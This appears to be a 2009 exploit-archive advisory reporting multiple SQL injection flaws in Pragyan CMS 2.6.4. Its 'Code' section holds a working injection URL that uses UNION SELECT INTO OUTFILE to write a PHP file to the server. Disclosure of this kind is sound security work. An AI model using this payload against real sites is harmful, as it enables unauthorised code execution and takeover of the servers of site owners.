@@ -1,0 +1,62 @@
+*******   Salvatore "drosophila" Fresta   *******
+
+[+] Application: Pragyan CMS
+[+] Version: 2.6.4
+[+] Website: http://www.pragyan.org
+
+[+] Bugs: [A] Multiple SQL Injection
+
+[+] Exploitation: Remote
+[+] Date: 22 Apr 2009
+
+[+] Discovered by: Salvatore "drosophila" Fresta
+[+] Author: Salvatore "drosophila" Fresta
+[+] Contact: e-mail: drosophilaxxx@gmail.com
+
+
+*************************************************
+
+[+] Menu
+
+1) Bugs
+2) Code
+3) Fix
+
+
+*************************************************
+
+[+] Bugs
+
+
+- [A] Multiple SQL Injection
+
+[-] Risk: hight
+[-] Requisites: magic_quotes_gpc = off/on
+
+This web application is entirely vulnerable to 
+SQL Injection because any variable is not 
+properly sanitised before being used in an SQL 
+query. This can be exploited to manipulate SQL 
+queries by injecting arbitrary SQL code.
+
+
+*************************************************
+
+[+] Code
+
+
+- [A] Multiple SQL Injection
+
+http://www.site.com/path/?action=view&fileget=-1' UNION ALL SELECT 'evil_code',2,3,4,5,6,7 INTO OUTFILE '/path/evil.php'%23
+
+
+*************************************************
+
+[+] Fix
+
+You must sanitise any user input.
+
+
+*************************************************
+
+# milw0rm.com [2009-04-24]
